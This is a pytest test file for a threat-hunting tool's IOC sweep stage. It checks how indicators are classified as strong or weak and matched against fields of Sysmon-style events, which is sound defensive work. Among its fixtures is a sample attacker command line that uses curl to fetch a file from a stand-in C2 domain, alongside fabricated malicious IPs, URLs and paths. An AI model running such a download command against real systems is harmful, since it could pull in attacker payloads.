"""Khâu quét IOC (s2_ioc_sweep): phân loại mạnh/yếu và quét đúng trường. Dữ liệu tự soạn, không lấy từ report đánh giá."""
import duckdb
import pytest

from cti_hunt.config import ROOT
from cti_hunt.contracts import IOC, ContractA, SourceSpan
from cti_hunt.stages import s2_ioc, s2_ioc_sweep

RULES = s2_ioc.load_rules(ROOT / "configs" / "ioc_rules.yaml")
H = "a" * 64
EXCL = ["^system$", r"\$$"]


def ioc(kind, value, text=""):
    return IOC(type=kind, value=value, source_span=SourceSpan(text=text, segment_id="T-001"))


def level(kind, value, text="", publisher=""):
    return s2_ioc_sweep.classify(ioc(kind, value, text), value.lower(), publisher)[0]


@pytest.mark.parametrize("kind, value, text, expect", [
    ("hash", H, f"sha256:{H}", "manh"),
    ("hash", "b" * 32, "imphash:" + "b" * 32, "yeu"),            # imphash dùng chung giữa nhiều chương trình
    ("hash", "c" * 40, "tree " + "c" * 40 + "\nauthor x", "yeu"),   # mã đối tượng git trong log commit dán vào bài
    ("hash", "d" * 64, "Chacha20-Poly1305 Key: " + "d" * 64, "yeu"),   # khóa mã hóa
    ("hash", "e" * 64, "Value 2: " + "e" * 64, "yeu"),
    ("hash", "f" * 64, "public SSH key fingerprint " + "f" * 64, "yeu"),
    ("hash", "c" * 40, "WebDriver.dll - " + "c" * 40, "manh"),         # mã băm tệp kèm tên tệp vẫn là mạnh
    ("ip", "45.77.12.34", "", "manh"),
    ("ip", "10.0.0.5", "", "yeu"),                               # IP nội bộ
    ("ip", "8.8.4.4", "", "yeu"),                                # DNS công cộng
    ("ip", "104.21.76.140", "", "yeu"),                          # CDN Cloudflare dùng chung
    ("ip", "192.88.99.1", "", "yeu"),                            # dải đặc biệt IANA ipaddress vẫn coi là global
    ("ip", "1.0.0.0", "", "yeu"),                                # địa chỉ mạng, thường là số phiên bản
    ("domain", "ns2.dnsowl.com", "", "yeu"),                     # máy chủ tên miền của nhà cung cấp DNS
    ("domain", "evil-c2.net", "", "manh"),
    ("domain", "d.docs.live.net", "", "yeu"),                     # dịch vụ phổ biến
    ("domain", "x.mfeagents.workers.dev", "", "manh"),            # nền tảng cho thuê tên miền con: không coi là dịch vụ
    ("url", "https://thedfirreport.com/2024/a/", "", "bo"),        # nhà xuất bản CTI
    ("url", "https://evil-c2.net/fig.png", "", "bo"),              # ảnh minh họa
    ("url", "http://45.77.12.34/a.exe", "", "manh"),
    ("ten_file", "update.exe", "", "yeu"),                         # tên tệp trơn
    ("duong_dan", r"c:\users\public\evil.exe", "", "manh"),
    ("duong_dan", "c:\\windows\\temp\\", "", "yeu"),               # thư mục: khớp mọi tệp bên trong
    ("duong_dan", r"c:\users", "", "yeu"),
    # 15/10: tệp có sẵn của Windows nằm thẳng trong thư mục hệ thống (CORNFLAKE.V3 nêu arp.exe) — yếu
    ("duong_dan", r"c:\windows\system32\arp.exe", "", "yeu"),
    ("duong_dan", r"%windir%\syswow64\rundll32.exe", "", "yeu"),
    ("duong_dan", r"c:\windows\system32\wbem\wmic.exe", "", "yeu"),
    ("duong_dan", r"c:\windows\explorer.exe", "", "yeu"),
    ("duong_dan", r"c:\windows\system32\libvlc.dll", "", "manh"),   # DLL thả vào System32 (ToddyCat): giữ mạnh
    ("duong_dan", r"c:\windows\system32\update.bin", "", "manh"),
    ("duong_dan", r"c:\windows\apppatch\apppatch64\sysmain.dll", "", "manh"),   # sâu hơn thư mục hệ thống: giữ mạnh
    ("duong_dan", r"c:\windows\temp\a.exe", "", "manh"),
    ("registry", r"hklm\software\microsoft\windows\currentversion\run\updater", "", "manh"),
    ("registry", r"hklm\software\microsoft\windows", "", "yeu"),     # vị trí chung
    ("registry", "hklm\\currentcontrolset\\services\\", "", "yeu"),    # khóa bị cắt
])
def test_classify(kind, value, text, expect):
    assert level(kind, value, text) == expect


def test_publisher_domain_is_dropped():
    assert level("domain", "blog.example-vendor.com", publisher="example-vendor.com") == "bo"


def test_plan_refangs_dedupes_and_splits_url_host():
    ca = ContractA(report_id="T", source_url="https://www.example-vendor.com/post",
                   iocs=[ioc("domain", "evil-c2[.]net"), ioc("domain", "evil-c2.net"), ioc("url", "hxxp://45.77.12[.]34/a.exe")])
    items = {(i["loai"], i["gia_tri"]): i for i in s2_ioc_sweep.plan(ca, RULES)}
    assert set(items) == {("domain", "evil-c2.net"), ("url", "http://45.77.12.34/a.exe"), ("ip", "45.77.12.34")}
    assert items[("ip", "45.77.12.34")]["ly_do"] == "tên máy tách từ URL"


def events_con(rows):
    con = duckdb.connect()
    cols = ["ev_host", "ev_channel", "ev_eid", "ev_rec", "Hashes", "CommandLine", "DestinationIp", "SourceIp", "QueryName",
            "TargetFilename", "Image", "User"]
    con.execute("CREATE TABLE events (" + ", ".join(f'"{c}" VARCHAR' if c != "ev_eid" else '"ev_eid" INTEGER' for c in cols) + ")")
    for r in rows:
        con.execute(f"INSERT INTO events VALUES ({', '.join('?' for _ in cols)})", [r.get(c) for c in cols])
    return con


S1 = S3 = "microsoft-windows-sysmon/operational"


def test_sweep_matches_only_the_right_fields():
    con = events_con([
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "1", "Hashes": f"SHA256={H.upper()}", "User": r"DOM\alice"},
        # mã băm lẫn trong dòng lệnh không phải trường mã băm: không tính
        {"ev_host": "WS2", "ev_channel": S1, "ev_eid": 1, "ev_rec": "2", "CommandLine": f"echo {H}", "User": "SYSTEM"},
        {"ev_host": "WS1", "ev_channel": S3, "ev_eid": 3, "ev_rec": "3", "DestinationIp": "45.77.12.34", "User": "WS1$"},
        {"ev_host": "WS3", "ev_channel": S3, "ev_eid": 22, "ev_rec": "4", "QueryName": "cdn.evil-c2.net"},
        {"ev_host": "WS3", "ev_channel": S3, "ev_eid": 22, "ev_rec": "5", "QueryName": "notevil-c2.net"},
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 11, "ev_rec": "6", "TargetFilename": r"C:\Users\Public\Evil.exe"},
        {"ev_host": "WS4", "ev_channel": S1, "ev_eid": 1, "ev_rec": "7", "Image": r"C:\Windows\System32\update.exe"},
    ])
    ca = ContractA(report_id="T", iocs=[ioc("hash", H), ioc("url", "hxxp://45.77.12[.]34/a.exe"),
                                        ioc("domain", "evil-c2[.]net"), ioc("duong_dan", r"C:\Users\Public\evil.exe"),
                                        ioc("ten_file", "update.exe"), ioc("ip", "10.0.0.5")])
    items = s2_ioc_sweep.plan(ca, RULES)
    r = s2_ioc_sweep.sweep(items, con, exclude_accounts=EXCL)
    got = {(m["loai"], m["gia_tri"]): m for m in r["muc"]}
    assert got[("hash", H)]["so_su_kien"] == 1 and got[("hash", H)]["may"] == {"WS1": 1}
    assert got[("hash", H)]["tai_khoan"] == {"alice": 1}
    assert got[("ip", "45.77.12.34")]["so_su_kien"] == 1
    assert got[("ip", "45.77.12.34")]["tai_khoan"] == {}                # tài khoản máy bị loại
    assert got[("domain", "evil-c2.net")]["so_su_kien"] == 1             # tên miền con có, tên giống đuôi thì không
    assert got[("duong_dan", r"c:\users\public\evil.exe")]["so_su_kien"] == 1
    assert got[("ten_file", "update.exe")]["trang_thai"] == "khong_quet"  # IOC yếu: mặc định không quét
    assert got[("ip", "10.0.0.5")]["trang_thai"] == "khong_quet"
    assert r["thuc_the"]["may"] == {"WS1": 3, "WS3": 1}
    weak = s2_ioc_sweep.sweep(items, con, include_weak=True, exclude_accounts=EXCL)
    assert {(m["loai"], m["gia_tri"]): m for m in weak["muc"]}[("ten_file", "update.exe")]["so_su_kien"] == 1


def test_domain_and_ip_in_free_text_must_stand_alone():
    # 15/10: `microsoft.net` (tên miền rút nhầm) khớp 130 dòng lệnh có `Microsoft.NET\Framework`; IP khớp lồng trong IP khác
    con = events_con([
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "1",
         "CommandLine": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe install"},
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "2", "CommandLine": "curl http://evil-c2.net/a -o x"},
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "3", "CommandLine": "ping evil-c2.net"},
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "4", "CommandLine": "ping 145.77.12.34"},
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "5", "CommandLine": "ping 45.77.12.34"},
        {"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "6", "CommandLine": "nslookup evil-c2.net.au"},
    ])
    ca = ContractA(report_id="T", iocs=[ioc("domain", "microsoft[.]net"), ioc("domain", "evil-c2[.]net"),
                                        ioc("ip", "45.77.12[.]34")])
    got = {(m["loai"], m["gia_tri"]): m for m in s2_ioc_sweep.sweep(s2_ioc_sweep.plan(ca, RULES), con)["muc"]}
    assert got[("domain", "microsoft.net")]["so_su_kien"] == 0
    assert got[("domain", "evil-c2.net")]["so_su_kien"] == 2
    assert got[("ip", "45.77.12.34")]["so_su_kien"] == 1


def test_missing_field_is_reported_not_zero():
    con = events_con([{"ev_host": "WS1", "ev_channel": S1, "ev_eid": 1, "ev_rec": "1"}])
    r = s2_ioc_sweep.sweep(s2_ioc_sweep.plan(ContractA(report_id="T", iocs=[ioc("named_pipe", r"\\.\pipe\evil")]), RULES), con)
    assert r["muc"][0]["trang_thai"] == "khong_co_truong"


def test_render_says_hits_are_leads_not_verdicts():
    con = events_con([])
    md = s2_ioc_sweep.render(s2_ioc_sweep.sweep(s2_ioc_sweep.plan(ContractA(report_id="T", iocs=[ioc("hash", H)]), RULES), con))
    assert "| Giá trị | Loại | Mức |" in md and "không tự kết luận" in md
    for word in ("buoc", "labeled", "attack_labels"):
        assert word not in md
